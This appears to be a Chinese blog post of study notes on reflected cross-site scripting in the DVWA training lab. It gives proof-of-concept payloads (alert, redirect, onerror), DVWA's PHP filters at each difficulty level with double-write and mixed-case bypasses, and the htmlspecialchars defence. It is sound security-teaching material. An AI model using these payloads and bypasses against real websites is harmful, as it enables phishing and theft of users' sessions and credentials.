+++
date = "2020-02-05T19:36:26+08:00"
categories = ["渗透测试"]
tags = ["OWS-TOP10","xss","笔记"]


title = "xss学习笔记——反射型"
description = "如何发现，并验证xss跨站脚本漏洞的存在"
images = []

+++

# 环境

- 靶机：dvwa
- 测试工具：BurpSuit，HackBar, Netcat

**XSS 漏洞产生的原因，和 SQL 注入有“异曲同工之妙”，所以 XSS 又称作“ HTML 注入”，都是没有对用户输入的内容，进行检查过滤而导致站点被恶意利用，或者服务器数据被窃取，那么如何发现 XSS 漏洞的存在呢**

## 一、验证思路

① 输入的内容提交后，查找当前页面中，有无显示输入的内容<br>
② 输入漏洞验证代码，看是否有效

## 二、漏洞验证Poc  

利用 HTML 语言中的几个常见的标签，以及 javascript，可以实现验证漏洞是否存在</br>
**例子中跳转的网页，我用的自己的路由器后台管理地址。**

```HTML
1 <script>alert('xss')</script>
2 <script>window.location="http://192.168.31.1"</script>
3 <script>window.open('http://192.168.31.1')</script>
3 <a href="http://192.168.31.1">click here</a>
4 <a href="" onclick=alert('xss')>click here</a>
5 <img src="http://192.168.31.1/a.img" onerror=alert('xss')>
```

当然，不是什么时候都会有效果</br>

随着靶场等级的提高，对用户的输入内容就会愈加严格检查和过滤</br>

思路要骚，才能绕过限制:D

### ① 靶场等级：low

没有任何过滤，输入的所有poc均生效

```php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

```

### ② 靶场等级：medl

匹配字符串非法字符，并替换为空字符串</br>

```php
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] ); 
```

Ⅰ. 双写绕过

```javascript
   <sc<script>ript>alert('xss')</script>
```

Ⅱ. 大、小写混写绕过

```javascript
   <ScrIPT>alert('xss')</script>
```

Ⅲ. 其他标签、事件绕过


### ③ 靶场等级：high

```php
// Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); 
```

加强了过滤规则，采用正则替换</br>

上一个方法中的双写、大小写都失效了

还好没有过滤其他的标签，和上一个一样，可以用其他标签触发XSS

### ④ 靶场等级：impossible

加入了 **user_token** 验证，和 **htmlspecialchars()** 函数对输入的字符串进行 “无害化处理”</br>

这个例子中，各种姿势也没用了T_T

```php
<?php
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
// Generate Anti-CSRF token
generateSessionToken();
?> 
```

# 总结

通过查阅freebuff上大佬的解释

> 可以看到，通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。

学到的三个防御xss的函数

- str_replace()
- preg_replace()
- htmlspecialchars()

反射型 xss，各种钓鱼链接都会利用网站存在 xss 结合钓鱼页面，骗取点击，获取受害者的登陆 cookie，或者是账号密码等信息</br>

接下来就是如何利用xss ，获取用户登陆 cookie，以及实现键盘记录器了：D

- [参考文章来自Freebuf](https://www.freebuf.com/articles/web/123779.html)